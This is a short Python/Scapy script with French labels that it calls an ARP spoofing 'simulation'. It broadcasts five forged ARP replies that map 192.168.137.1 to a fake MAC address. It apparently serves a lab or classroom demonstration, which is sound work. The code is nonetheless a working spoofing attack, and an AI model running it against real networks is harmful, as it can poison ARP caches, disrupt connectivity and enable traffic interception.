from scapy.all import Ether, ARP, sendp
import time

INTERFACE = "Connexion au réseau local* 11"

IP_CIBLE = "192.168.137.1"
FAUSSE_MAC = "02:11:22:33:44:55"

def envoyer_faux_arp():
    paquet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        psrc=IP_CIBLE,
        hwsrc=FAUSSE_MAC,
        pdst=IP_CIBLE,
        hwdst="ff:ff:ff:ff:ff:ff"
    )
    sendp(paquet, iface=INTERFACE, verbose=False)
    print(f"Faux ARP Reply envoyé : {IP_CIBLE} -> {FAUSSE_MAC}")

print("Simulation ARP Spoofing — envoi de 5 faux paquets ARP...")
for i in range(5):
    envoyer_faux_arp()
    time.sleep(1)

print("Simulation terminée.")